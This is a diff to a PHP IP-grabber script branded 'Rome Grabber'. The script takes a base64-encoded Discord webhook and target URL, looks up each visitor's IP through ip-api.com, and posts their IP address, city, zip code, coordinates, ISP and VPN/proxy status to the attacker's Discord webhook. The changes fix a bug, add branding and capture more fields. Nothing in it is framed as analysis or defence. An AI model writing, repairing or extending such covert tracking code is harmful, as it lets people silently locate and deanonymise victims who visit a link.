@@ -1,12 +1,13 @@
 <?php
 const WEBHOOK_DEFAULT = "https://discordapp.com/api/webhooks/";
-const IP_API_FIELDS = "16999419";
+const ROME_GRABBER_LOGO = "https://i.ibb.co/sq2yKzt/rome-grabber-logo.png";
+const IP_API_FIELDS = "26436603";
 
 $webhook_id = base64_decode($_GET["id"]);
 $target_website = base64_decode($_GET["target"]);
 
 if ($webhook_id && $target_website) {
-    $ip_details = json_decode(file_get_contents("http://ip-api.com/json/?fields=$IP_API_CODE"));
+    $ip_details = json_decode(file_get_contents("http://ip-api.com/json/?fields=" . IP_API_FIELDS));
 
     $discord_country_flag = ":flag_" . strtolower($ip_details->countryCode) . ":";
     $mobile = $ip_details->mobile ? "Yes" : "No";
@@ -15,24 +16,28 @@ if ($webhook_id && $target_website) {
 
     $payload = json_encode(array(
         "username" => "RomeG Bot",
+        "avatar_url" => ROME_GRABBER_LOGO,
         "embeds" => array(
             array(
                 "title" => "<---- [ :bow_and_arrow: IP Address Captured ] ---->",
                 "description" => "
-                    **IP:** $ip_details->query
-                    **Country:** $ip_details->country $discord_country_flag
-                    **Region/state:** $ip_details->regionName
-                    **City:** $ip_details->city
-                    **Zip code:** $ip_details->zip
-                    **Geolocation:** lat: $ip_details->lat / lon: $ip_details->lon
-                    **Timezone:** $ip_details->timezone
-                    **ISP:** $ip_details->isp
-                    **Mobile connection:** $mobile
-                    **Proxy/VPN/Tor:** $proxy
-                    **Hosting:** $hosting",
+                    **:satellite: Information** ($discord_country_flag $ip_details->query)
+```IP: $ip_details->query
+Continent: $ip_details->continent
+Country: $ip_details->country
+Region/state: $ip_details->regionName
+City: $ip_details->city
+Zip code: $ip_details->zip
+Geolocation: lat: $ip_details->lat / lon: $ip_details->lon
+Timezone: $ip_details->timezone
+National currency: $ip_details->currency
+ISP: $ip_details->isp
+Mobile connection: $mobile
+Proxy/VPN/Tor: $proxy
+Hosting: $hosting```",
                 "color" => hexdec("#daa520"),
-                "footer" => array(
-                    "text" => "RomeG"
+                "thumbnail" => array(
+                    "url" => ROME_GRABBER_LOGO
                 )
             )
         )
